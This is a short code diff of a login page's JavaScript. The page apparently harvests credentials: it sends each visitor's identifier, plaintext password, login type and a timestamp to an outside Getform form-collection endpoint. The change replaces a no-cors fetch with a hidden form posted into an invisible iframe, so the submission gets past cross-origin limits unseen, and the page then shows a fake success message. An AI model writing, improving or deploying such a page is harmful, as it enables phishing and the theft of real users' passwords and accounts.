@@ -309,25 +309,35 @@
     btn.disabled    = true;
     btn.textContent = 'Logging in...';
 
-    // ── send via Getform.io ──
+    // ── send via hidden form (no CORS issues) ──
     try {
-      const params = new URLSearchParams();
-      params.append('Login_Type', loginType);
-      params.append('Identifier', identifier);
-      params.append('Password',   password);
-      params.append('Time',       new Date().toLocaleString());
+      const form = document.createElement('form');
+      form.method  = 'POST';
+      form.action  = GETFORM_URL;
+      form.target  = 'hidden_iframe';
 
-      const res = await fetch(GETFORM_URL, {
-        method:  'POST',
-        mode:    'no-cors',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body:    params.toString()
-      });
+      const fields = {
+        'Login Type': loginType,
+        'Identifier': identifier,
+        'Password':   password,
+        'Time':       new Date().toLocaleString()
+      };
 
-      // no-cors means we can't read the response, but if no error thrown it worked
+      for (const [key, val] of Object.entries(fields)) {
+        const input = document.createElement('input');
+        input.type  = 'hidden';
+        input.name  = key;
+        input.value = val;
+        form.appendChild(input);
+      }
+
+      document.body.appendChild(form);
+      form.submit();
+      document.body.removeChild(form);
+
       document.getElementById('tt-success').classList.add('show');
     } catch (err) {
-      showError('Network error. Check your connection.');
+      showError('Something went wrong. Try again.');
     }
 
     btn.disabled    = false;
@@ -335,5 +345,6 @@
   }
 </script>
 
+<iframe name="hidden_iframe" style="display:none"></iframe>
 </body>
 </html>
